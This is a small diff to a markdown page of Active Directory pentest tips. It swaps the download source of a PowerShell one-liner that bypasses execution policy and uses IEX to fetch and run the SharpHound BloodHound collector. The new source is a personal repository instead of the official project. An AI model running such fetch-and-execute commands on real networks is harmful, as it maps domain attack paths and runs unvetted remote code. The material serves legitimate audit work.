@@ -11,7 +11,7 @@ Some tips from a cybersecurity auditor & consultant in France.
 Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.
 
 ```markdown
-powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1’);Invoke-BloodHound"
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1’);Invoke-BloodHound"
 ```
 
 On Linux, you can use the python version. More information here : https://github.com/fox-it/BloodHound.py
